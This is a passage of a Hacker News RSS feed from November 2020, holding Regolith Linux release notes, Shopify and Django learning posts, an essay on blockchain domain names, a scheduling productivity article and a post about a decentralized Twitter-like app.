picom (8-1~1.gbp353272ubuntu1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Remove github files from debian branch.


picom (8-1~1.gbp353272) bionic; urgency=medium

  [ Ken Gilmer ]
  * New upstream version 8


########################################
# Release Notes for plano-theme
########################################
plano-theme (3.36-1-1regolith1) bionic; urgency=medium

  [ Ken Gilmer ]
  * New upstream version 3.36-1


########################################
# Release Notes for plymouth-theme-regolith
########################################
plymouth-theme-regolith (1.0.3-1) focal; urgency=medium

  * Tweaks to config files. 


plymouth-theme-regolith (1.0.2-1) focal; urgency=medium

  * Ship grub file. 


plymouth-theme-regolith (1.0.1-1) focal; urgency=medium

  * Add package hooks. 



########################################
# Release Notes for pop-fonts
########################################
pop-fonts (1.0.3~1555617065~18.04~a86eb73) bionic; urgency=medium

  * Auto Build

########################################
# Release Notes for python3-i3ipc
########################################
python3-i3ipc (2.1.1-1ubuntu1~ppa7) bionic; urgency=medium

  * Changes to python version.


i3ipc-python (2.1.1-1ubuntu1~ppa6) bionic; urgency=medium

  * Update build dependencies hoping to resolve packaing problems. 


i3ipc-python (2.1.1-1ubuntu1~ppa4) eoan; urgency=medium

  * Add python-xlib dependency. 


i3ipc-python (2.1.1-1ubuntu1~ppa2) eoan; urgency=medium

  * Initial release from https://github.com/altdesktop/i3ipc-python/archive/v2.1.1.tar.gz.


########################################
# Release Notes for regolith-compositor-compton-glx
########################################
regolith-compositor-compton-glx (1.1.0-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Init script will kill pre-existing app instance before starting new. Part of fix for https://github.com/regolith-linux/regolith-desktop/issues/475.


regolith-compositor-compton-glx (1.0.10-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Fix typo in compton config file, found by @gservat.


regolith-compositor-compton-glx (1.0.9-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Add xrender-sync-fence to handle issue https://github.com/regolith-linux/regolith-desktop/issues/116.


regolith-compositor-compton-glx (1.0.8-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Ship config file.


regolith-compositor-compton-glx (1.0.7-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Add gbp conf file, cleanup.



########################################
# Release Notes for regolith-compositor-none
########################################
regolith-compositor-none (1.0.3-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Add gbp conf file, cleanup.



########################################
# Release Notes for regolith-compositor-picom-glx
########################################
regolith-compositor-picom-glx (1.1.1-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Fix typo found in https://github.com/regolith-linux/regolith-compositor-picom-glx/issues/1.
  * Init script will kill pre-existing app instance before starting new. Part of fix for https://github.com/regolith-linux/regolith-desktop/issues/475.


regolith-compositor-picom-glx (1.0.1-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Fix typo found in 
  https://github.com/regolith-linux/regolith-compositor-picom-glx/issues/1.


regolith-compositor-picom-glx (1.0.0-1) bionic; urgency=medium

  * Initial release


########################################
# Release Notes for regolith-compositor-xcompmgr
########################################
regolith-compositor-xcompmgr (1.2.0-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Init script will kill pre-existing app instance before starting new. Part of fix for https://github.com/regolith-linux/regolith-desktop/issues/475.


regolith-compositor-xcompmgr (1.1.0-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Add ability to override xcompmgr defaults. Fixes https://github.com/regolith-linux/regolith-desktop/issues/382.


regolith-compositor-xcompmgr (1.0.3-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Add gbp conf file, cleanup.



########################################
# Release Notes for regolith-default-settings
########################################
regolith-default-settings (1.0-1bionic1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Add bionic specific gsettings overrides.


regolith-default-settings (1.0-1) focal; urgency=medium

  * Initial release, files moved from package regolith-gnome-flashback.


########################################
# Release Notes for regolith-desktop
########################################
regolith-desktop (2.78-1bionic) bionic; urgency=medium

  [ Ken Gilmer ]
  * Move from compton to picom as default compositor.

</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://regolith-linux.org/docs/reference/releases/regolith-1.5-release-notes/">https://regolith-linux.org/docs/reference/releases/regolith-1.5-release-notes/</a></em></p>]]>
            </description>
            <link>https://regolith-linux.org/docs/reference/releases/regolith-1.5-release-notes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067509</guid>
            <pubDate>Thu, 12 Nov 2020 07:51:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Become a Shopify Developer – Resources to Become a Shopify Dev]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25067407">thread link</a>) | @iliashad
<br/>
November 11, 2020 | https://iliashaddad.com/blog/how-to-become-shopify-developer | <a href="https://web.archive.org/web/*/https://iliashaddad.com/blog/how-to-become-shopify-developer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><div><article><div><p><span>
      <a href="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/af240/how-to-become-shopify-developer-0.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="how to become shopify developer 0" title="how to become shopify developer 0" src="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/0a251/how-to-become-shopify-developer-0.jpg" srcset="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/bce2d/how-to-become-shopify-developer-0.jpg 250w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/953fe/how-to-become-shopify-developer-0.jpg 500w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/0a251/how-to-become-shopify-developer-0.jpg 1000w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/e3932/how-to-become-shopify-developer-0.jpg 1500w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/451a4/how-to-become-shopify-developer-0.jpg 2000w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/af240/how-to-become-shopify-developer-0.jpg 2600w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
  </a>
    </span></p><p>Shopify has been growing so fast in the last couple of years. “We made history in 2018: no other SaaS company has crossed the $1 billion-dollar revenue mark at a faster growth rate than Shopify has,” said <a href="https://investors.shopify.com/Investor-News-Details/2019/Shopify-Announces-Fourth-Quarter-and-Full-Year-2018-Financial-Results/default.aspx">Tobi Lütke</a></p><p>I’m a self-taught developer who worked as a freelancer and indie maker in 2019 and I learned Shopify app and theme development and I want to share with you resources that help me to become a Shopify developer</p><h3><strong>Prerequisite to learn Shopify Theme Development&nbsp;:</strong></h3><p>Shopify theme is like WordPress themes but Shopify use their markup language (Liquid ) instead of PHP</p><p>You need to</p><ul><li>have basic knowledge with HTML5, CSS3, and JavaScript</li><li>have basic knowledge with jQuey (Many Shopify libraries use jQuery ) — Optional</li><li>have basic knowledge with Command Line</li><li>Create a <a href="https://accounts.shopify.com/signup">Shopify Partner account</a> to upload and test your Shopify theme (Free with unlimited Shopify store for development)</li></ul><h3>Prerequisite to learn Shopify App Development&nbsp;:</h3><p>Shopify app is a web app and you can use any programming language like Ruby, Python, PHP or Node JS to build one and in this guide, I’ll focus on Node JS in this guide</p><p>You need to&nbsp;:</p><ul><li>have basic knowledge with HTML5, CSS3</li><li>a good understanding of JavaScript and React (Shopify Polaris built With React but you can use any framework or just vanilla JS)</li><li>good understanding of how to build a full-stack web application (Authentication, consume external API, Send Requests from the front end and deal with it in the back end )</li><li>have basic knowledge with GraphQL (Shopify API built with GraphQL)</li><li>Create a <a href="https://accounts.shopify.com/signup">Shopify Partner account</a> to create, test and publish your Shopify app (Free)</li></ul><h3>Ressources to learn Shopify Theme Development</h3><ul><li><a href="https://www.shopify.com/partners/blog/">Shopify Partner Blog</a>: Articles and guides about design inspiration, Shopify development tips</li><li><a href="https://www.shopify.com/partners/academy">Shopify Partner Academy</a>: Free courses from Shopify team to learn how to work with Shopify tools</li><li><a href="https://www.skillshare.com/classes/Shopify-Essentials-for-Web-Developers-From-Store-Setup-to-Custom-Themes/1070001866/projects">Shopify for web dev</a>elopers: (Free course) Set up your first Shopify store and create your first custom Shopify theme by a Shopify Expert</li><li><a href="https://www.skillshare.com/classes/Advanced-Shopify-Theme-Development/708093439?utm_campaign=video-embed-708093439&amp;utm_source=Video&amp;utm_medium=video-embed">Advanced Shopify</a> Theme: (Free course) Create advanced Shopify theme (Make Shopify theme a single web app using AJAX ) by a Shopify expert</li><li><a href="https://www.shopify.co.uk/partners/shopify-cheat-sheet">Liquid Cheatsheet</a>: Cheatsheet to get all Shopify liquid variables, filters, and helpers</li><li><a href="https://shopify.github.io/liquid-code-examples/">Liquid Code Examples:</a> Collection of code snippets to speed up your development process and understand how to write liquid code</li><li><a href="https://www.youtube.com/playlist?list=PLXQCP3o-w1Pvras8iuflJKO3tfkBT8c0c">Shopify YB Playlist:</a> Youtube course to learn Shopify theme development</li><li><a href="https://shopify.github.io/themekit/">Shopify Theme Kit</a>: a command-line tool to upload your Shopify theme to a Shopify store automatically when changes are made locally</li><li><a href="https://help.shopify.com/en/themes/development">Shopify Theme Docs</a>: Shopify docs to create your Shopify theme</li></ul><h3>Ressources to learn Shopify App Development</h3><ul><li><a href="https://www.shopify.com/partners/blog/">Shopify Partner Blog</a>: Articles and guides about design inspiration, Shopify development tips</li><li><a href="https://www.shopify.com/partners/academy">Shopify Partner Academy</a>: Free courses from Shopify team to learn how to work with Shopify tools</li><li><a href="https://developers.shopify.com/tutorials/build-a-shopify-app-with-node-and-react/set-up-your-app">Shopify React Node App</a>: Tutorial by Shopify team to create your first React and Node JS Shopify app using Polaris (Shopify React design system) and KOA Js to handle server-side rendering</li><li><a href="https://github.com/Shopify/shopify-app-cli">Shopify App CLI:</a> Create your Shopify app like (Create React App), serve your shopify app in Ngrok server (Free) and update your Ngrok server link automatically in your Shopify App dashboard</li></ul><h3>Conclusion</h3><p>Thanks for reading, I wish you the best on your new journey.</p></div></article></div></main></div></div>]]>
            </description>
            <link>https://iliashaddad.com/blog/how-to-become-shopify-developer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067407</guid>
            <pubDate>Thu, 12 Nov 2020 07:32:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I learned Django so well – Blog post]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067291">thread link</a>) | @codewithstein
<br/>
November 11, 2020 | https://codewithstein.com/how-i-learned-django-so-well/ | <a href="https://web.archive.org/web/*/https://codewithstein.com/how-i-learned-django-so-well/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			    	
<div>
    <article itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting">
	

        

        <p>
            <time datetime="20-11-11">Code With Stein / Nov 11, 20 / 0 comments</time>

            /

            
                <a href="https://codewithstein.com/misc/">#Misc</a>
            
        </p>

        <hr>

        <p itemprop="description">
            People of ask me here on YouTube and by e-mail how I have learned Django so well. I thought I could create a video where I explain it to all of you at once.... and here it is.
        </p>

         

        <div itemprop="articleBody">
            <p>I was introduced to Django when it was released back in around 2005/2006. I watched a video conference called Snakes and Rubies where they talked about Django and Ruby on Rails. I was really impressed with the talk about Django. Adrian made a great talk about the framework.</p>

<p>After the video, I played around with both of the frameworks, but Django quickly became my favorite. I already knew basic Python, so I understood much of the Django code.</p>

<p>I learned the basics and built a couple of small projects. After a few years, I built the biggest project I had done so far. This was a website called "finn en frilanser" which is Norwegian for "find a freelancer". So it was basically a Norwegian version of elance, guru and similar. I learned a lot during this process and it was a really cool project to build.</p>

<p>A few years after this, I built a new really big project using Django. This was a project called "FinnFido". This is kind of an amber alert web application for lost and found pets. I also built an API for the same application which I used for an iPhone and Android app.</p>

<p>So, most of why knowledge has comes from building different projects. Each time I start something new, I try to think of new features I can implement so I can learn even more. For the API I built, I had to learn a lot about JSON and security.</p>

<p>What I think has made me learn most of the Django I know, is actually making videos about the subject. Because when I make videos, I need to explain many different things in my own words. This make it stick better in my head. </p>

<p>When I go through someone elses tutorials, I like to play around with code. I use different variable names and values, change the function names etc. Doing this makes it easier to understand why things are done the way they are.</p>

<p>People learn differently, and the best way for me to learn is "learn by doing" and making it stick better by explaining things in my own words. So this sums up what I have done to learn Django. </p>

<p>This also applies to everything else I know. I learn by doing and becomes even better when I try to teach other about it.</p>

<p>And that's it.</p>

<h2>Video</h2>

<p><iframe width="100%" height="400" src="https://www.youtube.com/embed/PA1AC1vDOfk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
        </div>

        <hr>

        <h3>Comments</h3>

        
            <p>No comments yet...</p>
        

        <h3>Add comment</h3>

        

        
    </article>
</div>

			    </div></div>]]>
            </description>
            <link>https://codewithstein.com/how-i-learned-django-so-well/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067291</guid>
            <pubDate>Thu, 12 Nov 2020 07:12:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Abu Dhabi launches applied research centre (Middle East AI News)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066909">thread link</a>) | @asiaainews
<br/>
November 11, 2020 | https://www.getrevue.co/profile/middleeastainews/issues/abu-dhabi-launches-applied-research-centre-160m-ai-traffic-systems-centre-in-dubai-291113 | <a href="https://web.archive.org/web/*/https://www.getrevue.co/profile/middleeastainews/issues/abu-dhabi-launches-applied-research-centre-160m-ai-traffic-systems-centre-in-dubai-291113">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.getrevue.co/profile/middleeastainews/issues/abu-dhabi-launches-applied-research-centre-160m-ai-traffic-systems-centre-in-dubai-291113</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066909</guid>
            <pubDate>Thu, 12 Nov 2020 05:54:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Decentralized Internet Pt 1: Blockchain Domains]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25066874">thread link</a>) | @guttertec
<br/>
November 11, 2020 | https://www.axelquack.capital/blockchain-domains/ | <a href="https://web.archive.org/web/*/https://www.axelquack.capital/blockchain-domains/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<!-- .cover -->
			<div>
				<div id="post-content">
					<!--kg-card-begin: markdown--><p>It is a common misunderstanding to exclusively associate blockchain technology with cryptocurrencies like Bitcoin. The technology itself offers already a wide range of services like decentralized messaging services, marketplaces and – importantly – decentralized domain names, which cannot be censored or taken down completely. Imagine payments could be universally shared and owners have full control over their domain asset.</p>
<p>You might ask yourself "What is so special about this?" A simple answer is:  <strong>the internet of today is broken.</strong> We can use the internet, but we do not own anything we do. Here are a few reason why:</p>
<ol>
<li><a href="https://en.wikipedia.org/wiki/Domain_name_registrar">Registrars</a> are mandatory custodians of centralized domains like .com or .net.</li>
<li><a href="https://en.wikipedia.org/wiki/Domain_name_registry">Registries</a> can revoke domains or be taken down</li>
<li>Hosting services can take content offline entirely, not just off their service platform</li>
</ol>
<p>For the first time in history with the creation of blockchain networks like <a href="https://coinmarketcap.com/currencies/ethereum/">Ethereum</a>, <a href="https://filecoin.io/">Filecoin</a> and others there are new possibilities in regards of ownership and control. On the contrary, blockchain domains are not only decentralized but also secured using cryptographic encryption. They represent a new class of assets that truly belong to the owner, and not to a third party or central authority.</p>
<p>This has several advantages, both for the asset owners and their users – these include:</p>
<ul>
<li><strong>(Real) Ownership:</strong> The owner has a private key to their domain, so the domain will be entirely under their control. Current solutions are not governed by and do not require approval from e.g. <a href="https://www.icann.org/">ICANN</a>.</li>
<li><strong>Censorship-resistant:</strong> A blockchain domain also makes a website censorship-resistant for the owner, as private keys should be stored in a (ideally non-custodial) wallet to which only the owner has the keys. No third-party can interfere with or disable the site without the private keys.</li>
<li><strong>Replace cryptocurrency addresses with human-readable names:</strong> A blockchain domain replaces the need for copying and pasting rather cryptic wallet addresses and at the same time simplifies sending and receiving payments dramatically. The domains become <strong>payment gateways</strong> by attaching a cryptocurrency wallet address to a domain name; giving users the chance to send or pay money.</li>
<li><strong>Transfer speed:</strong> Blockchain domains do not require an escrow agent to securely exchange the domain or funds. This transfer can happen in less than 1 minute, from or to anywhere in the world.</li>
</ul>
<!--kg-card-end: markdown--><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/pLDDbCZXvTE?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><!--kg-card-begin: markdown--><h2 id="ethereumnameservices">Ethereum Name Services</h2>
<p><a href="https://en.wikipedia.org/wiki/Nick_Johnson_(software_engineer)">Nick Johnson</a> and <a href="https://medium.com/@avsa">Alex Van de Sande</a> of the Ethereum Foundation initially conceptualized the <a href="https://ens.domains/">ENS</a> (Ethereum Name Service).</p>
<p>It offers a names system on Blockchain that integrates with the traditional DNS, unlike some of its competitors, <a href="https://ens.domains/">ENS</a> does not want to replace DNS. Additionally the system provides a secure and decentralized way to address different resources using human-readable names. Instead of sending someones ETH to <em>0xa4edd4f3b6a3f15ecce4b73fd9a196cffc7d28ad</em>, a user can simply send to axelquack.eth.<br>
Lastly, another excellent property that <a href="https://ens.domains/">ENS</a> possesses is its interoperability with the rest of the Ethereum ecosystem. <a href="https://ens.domains/">ENS</a> can interact with all Ethereum-based smart contracts. One contract records all the domains and subdomains, as well the owner's details and the link to the Resolver, which is another smart contract that handles the translations from names to addresses or other types of resources and vice-versa.</p>
<p>It should be noted that <a href="https://ens.domains/">ENS</a> has an annual fee for an .eth domain. This fee is about 5 EUR/year for available domains of "normal length", payable in corresponding ETH value. Even though this might not sound expensive, but one should not forget that the provider can change the fee at any time. Since the user cannot simply move the domain to another provider, this is already a point that might be a disadvantage.</p>
<p>If you are using a browser like Brave or even Chrome, the <a href="https://metamask.io/">MetaMask</a> browser extension will give you support. For example, if you are using Chrome with MetaMask, enter "<a href="http://almonit.eth/">http://almonit.eth</a>" into the URL bar and a website search engine will be loaded.</p>
<!--kg-card-end: markdown--><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/g45ofhOyACg?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><!--kg-card-begin: markdown--><h2 id="unstoppabledomainscryptozil">Unstoppable Domains (.crypto/.zil)</h2>
<p><a href="https://unstoppabledomains.com/r/2df713a3dc584f7">Unstoppable Domains</a> was born in 2018 of <a href="https://www.linkedin.com/in/bradley-kam-444aa228/">Brad Kam's</a> desire to "build something at the intersection of tech and policy". Kam studied politics before he met co-founder <a href="https://www.linkedin.com/in/matthew-gould-7877361/">Matthew Gould</a> while working at his first startup, <a href="https://www.talkable.com/">Talkable</a>, a SaaS marketing platform. The startup is backed by <a href="https://draper.vc/">Draper Associates</a> &amp; <a href="https://www.boost.vc/">Boost VC</a> and also received grants from the Ethereum Foundation and the Zilliqa Foundation.</p>
<p>Users can connect with crypto domains such as .zil (live on the <a href="https://www.zilliqa.com/">Zilliqa</a> blockchain) or .crypto (live on Ethereum), to get paid as an example. All someone needs to know is their blockchain domain.<br>
The difference is that .zil domains are stored on and process transactions through the <a href="https://www.zilliqa.com/">Zilliqa</a> blockchain which has low fees. In contrast, .crypto domains are stored on and process transactions through the Ethereum blockchain. Both are capable of pointing to multiple cryptocurrency wallet addresses (for <a href="https://community.unstoppabledomains.com/t/what-cryptocurrencies-are-currently-supported/246">payments</a>) and censorship-resistant website content.</p>
<p>The exciting thing about Unstoppable Domains: A user really buys the domain. Once the domain has been paid for and ended up in a wallet (there is for instance a simple way to store your domains within Coinbase Wallet, Atomic Wallet and so on –&nbsp;but also the possibility to store in hardware wallets), nobody can take it away from the owner. Furthermore, <strong>there are no further costs</strong>. That puts the somewhat higher initial costs into perspective quickly. 40 USD are payable for a .crypto domain, 20 USD are payable for .zil domains. Another option is payment by PayPal or Credit Card.</p>
<p>There are multiple ways to access .crypto domains browsers with native support for decentralized websites include Brave (desktop version), Opera (mobile), Status (mobile), MetaMask Mobile (mobile), and Unstoppable Browser (desktop). Besides that it is always possible to install an official Chrome or Mozilla <a href="https://unstoppabledomains.com/extension">extension</a> to access websites built on p2p networks like <a href="https://ipfs.io/">IPFS</a>. The company itself offers a template marketplace and upload functionalities which are interconnected with <a href="https://pinata.cloud/">Pinata</a>.</p>
<p>In May 2020 Unstoppable Domains mentioned they have 200K+ domains registered, 4K+ IPFS websites launched, 12K+ unique Ethereum addresses that own domains just to share some of their key facts. Possible future functionalities mentioned  were support of Decentralized Databases like <a href="https://orbitdb.org/">OrbitDB</a> or <a href="https://gun.eco/">GUN</a> alongside paid hosting.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="finalthoughts">Final thoughts</h2>
<p>Decentralized systems, which do not require a central mediator to function, were already around at the time the Web was invented. Most notably, the Internet was increasingly gaining traction as a large-scale decentralized network. The rise of Blockchain Domains enables not only censorship-resistance, or a shift towards self-ownership, but also simplifies payments with crypto that could drive further adoption of digital assets.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: html--><hr>
<p><i>Website and the information contained herein is not intended to be a source of advice or credit analysis with respect to the material presented, and the information and/or documents contained in this website do not constitute investment advice.</i></p><!--kg-card-end: html-->
				</div><!-- .post-content -->
				<!-- .post-footer -->
			</div><!-- .inner -->
		</article></div>]]>
            </description>
            <link>https://www.axelquack.capital/blockchain-domains/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066874</guid>
            <pubDate>Thu, 12 Nov 2020 05:48:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Key to Consistency]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066783">thread link</a>) | @lassmaglio
<br/>
November 11, 2020 | https://www.sandromaglione.com/2020/11/10/key-to-consistency/ | <a href="https://web.archive.org/web/*/https://www.sandromaglione.com/2020/11/10/key-to-consistency/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Doing things is not easy. The simple act of starting some task can become daunting at times. It is often true that the hardest step is starting the work. Everything else from there will most of the time just flow smoothly.</p><p>We can summarize the secret of getting things done in one rule: <strong>how to make sure I will be able to start</strong>.</p><p>There could be many reasons that stop you from starting something. Some reasons more valid than others.</p><p>Generally, though, the main source of resistance is the mind. People conjure intricated excuses for why they should not do something. One of the most frequent is the maxim: “I do not have time right now, maybe later”.</p><p>We also know that, in order to achieve a goal, oftentimes consistency is more important than intensity.</p><p>It could be learning a new language, exercising, eating healthy. Consistency means doing a little bit of work every day to ensure success in the long run.</p><p>There are mainly three problems with this model:</p><ol><li>Consistency means starting a task every day</li><li>The results of your work may not be visible for a relatively long period of time</li><li>Doing something every day means forgoing some other activities to find the time to work consistently</li></ol><h3>The solution is simple</h3><p>The key to solving the riddle is called <strong>scheduling</strong>.</p><p>Scheduling means assigning a specific date and time to a task. It is as simple as opening an app (or using pen and paper) and picking a time frame in which you commit to doing the work.</p><p>Scheduling solves all the three problems we identified:</p><ol><li>When you schedule a task, you assign it a time slot every day. You won’t need to think about it anymore. The trigger will be the clock: when the time comes, you know what to do. There could be no reasonable excuses.</li><li>Scheduling allows you to look into the future and plan how long the whole process will take. Every day you show up will be another success. You will visually see yourself getting closer to the day in which all your discipline will bear its fruits.</li><li>Scheduling is not limited to a single task. You can easily schedule all your day to make sure you will be able to complete all the activities that you want. This process is liberating. It frees you from the burden of thinking what and when to do something in any given moment.</li></ol><h3>How to schedule</h3><p>There is no specific secret about scheduling. It is all about observing your day, from when you wake up to when you go to bed, and writing down what you will do in this time window.</p><p>It will take you 5 to 10 minutes to organize your activities and assign to each of them a start and finish time. Then you can simply stop bothering and go about your day.</p><p>Basically it all comes down to:</p><ol><li>List all the activities you need to perform, with an estimate of how long each activity will take to be completed</li><li>Sort your activities by priority</li><li>Choose when you are going to wake up and go to sleep</li><li>Build your day like a puzzle, assigning a time frame to each activity in order of priority</li></ol><p>These four steps are the basic blueprint. Many strategies and tricks exist to improve the efficiency and effectiveness of your scheduling.</p><p>Nonetheless, the core of the process is all about <strong>prioritizing and executing</strong>.</p><h3>Some secrets to help</h3><p>Some guidelines exist to help you with scheduling. Simple rules you can follow to increase even more you productivity.</p><h5><strong>Reduce context switching</strong></h5><p>Context switching is the time that it takes to switch from one activity to another. This time may vary based on the specific activity you perform.</p><p>For example, switching from studying to working out takes time: you need to reorder your books, prepare your clothes, go to the gym, etc.</p><p>In order to increase productivity, you should try to group similar task together, one after the other. This will help to reduce idle time and completing more tasks during the day (or maybe completing them faster and having more leisure time).</p><h5><strong>Schedule in the evening or in the morning</strong></h5><p>The process of scheduling may not be exciting at times. Scheduling must become a habit during your day. It is important to pick a moment during the day devoted to your scheduling plan. The same time every day.</p><p>Generally, first thing in the morning or last thing in the evening is ideal. That is because you will always have time in these moments of the day (by simply waking up a little earlier or going to bed a little later).</p><p>Furthermore, scheduling in the evening or morning allows you to take a look at your day before starting it, so you will know exactly what you are going to achieve for the day.</p><h5><strong>Never schedule on task after the other with no time in between</strong></h5><p>This rule refers back to the problem of context switching. No task can usually be started with no idle time from the previous one. And it shouldn’t be.</p><p>We need to give some time to our mind to reload. Therefore, always consider some time in between each task to relax.</p><h5><strong>Review the results at the end of the day</strong></h5><p>No matter if you write your schedule in the morning or evening, reviewing your results is paramount to your success. Take some time in the evening to look at your activities during the day.</p><p>This process will help you to estimate better your times and also have a critical look at what you do during your day.</p><h5><strong>Learn to estimate the time it takes for each activity</strong></h5><p>Scheduling is an estimation. We cannot know how much time each activity will actually take. Nonetheless, we assign it a time frame, from start to finish.</p><p>With time, our ability to estimate the amount of time to assign to each task will improve. Eventually, you should be able to schedule your day with a high degree of accuracy.</p><h5><strong>Schedule leisure time</strong></h5><p>Scheduling does not mean 24 hours of work. Scheduling is all about avoiding procrastination and improving efficiency. If you schedule your day properly, you will accomplish more in less time.</p><p>And guess what? All the time you gain in your day can be used to getting more things done or just chill and relax. <strong>You can literally increase your free time</strong>. All it takes is a little bit of planning and a little bit of consistency.</p><hr><h3>What are you waiting for?</h3><p>Scheduling is really a superpower. You will start seeing results in no time. You will feel less stressed during your day. You won’t need to think about what do to next. This habit will also give more meaning to your time. I cannot recommend it enough. Just try it and see how it goes.</p></div></div></div>]]>
            </description>
            <link>https://www.sandromaglione.com/2020/11/10/key-to-consistency/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066783</guid>
            <pubDate>Thu, 12 Nov 2020 05:30:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Member (Open Source, P2P, Decentralized Twitter Clone) Releases Windows App]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066663">thread link</a>) | @FreeTrade
<br/>
November 11, 2020 | https://member.cash/p/0cd5f21a46 | <a href="https://web.archive.org/web/*/https://member.cash/p/0cd5f21a46">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="previewcontent">
        <p>Member Desktop (Ember) is Twitter meets Bittorrent.

magnet:?xt=urn:btih:E1E4C04EFEA99A16A992FEF7F8E8F3C5964E865E

It runs on Windows with a single click. Includes pre-synced Bitcoin node, server, db, client. <a href="https://member.cash/m/freetrade">@freetrade</a></p><p><a href="https://member.cash/t/member">member</a></p><p><a href="https://member.cash/p/a058ec8564">Interesting.

Is it a bundled Virtual Machine?</a> <a href="https://member.cash/m/shadowofharbringer">@shadowofharbringer</a></p><p><a href="https://member.cash/p/c813d814a2">It is not a virtual machine - it requires Windows to run. Might look at Linux/Macos releases in the future. </a> <a href="https://member.cash/m/freetrade">@freetrade</a></p><p><a href="https://member.cash/p/3e4fe5c003">&gt;  it requires Windows to run

Well, that's unfortunate but I am no longer interested. I will wait for Linux release.</a> <a href="https://member.cash/m/shadowofharbringer">@shadowofharbringer</a></p><p><a href="https://member.cash/p/dc3a9e51f3">Whens the mobile app coming? ;) </a> <a href="https://member.cash/m/%F0%9D%90%85%F0%9D%90%84%F0%9D%90%84%F0%9D%90%8B%F0%9D%90%92">@𝐅𝐄𝐄𝐋𝐒</a></p><p><a href="https://member.cash/p/89d6d52caf">I'm not sure. Seems like a lot of work just to get banned doesn't it ? ;) PWA FTW</a> <a href="https://member.cash/m/freetrade">@freetrade</a></p><p><a href="https://member.cash/p/f3bedd316a">Just in case you missed this on Reddit - here's how to run on Linux. (member.cash uses ubuntu)

Yes, I just updated the repo with the latest 5.0.7 release - here it is - https://github</a> <a href="https://member.cash/m/freetrade">@freetrade</a></p><p><a href="https://member.cash/p/e961c4ab94">|.com/memberapp/server

Let me know if you have any problems.
</a> <a href="https://member.cash/m/freetrade">@freetrade</a></p><p><img src="https://member.cash/img/profilepics/19RyV6XQEww5td2LPWDpK8o5V8at7Vpwgv.640x640.jpg">
    </p></div></div>]]>
            </description>
            <link>https://member.cash/p/0cd5f21a46</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066663</guid>
            <pubDate>Thu, 12 Nov 2020 05:07:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Music-Related Copyright Claims and Twitch]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066598">thread link</a>) | @captn3m0
<br/>
November 11, 2020 | https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/ | <a href="https://web.archive.org/web/*/https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/">archive.org</a>
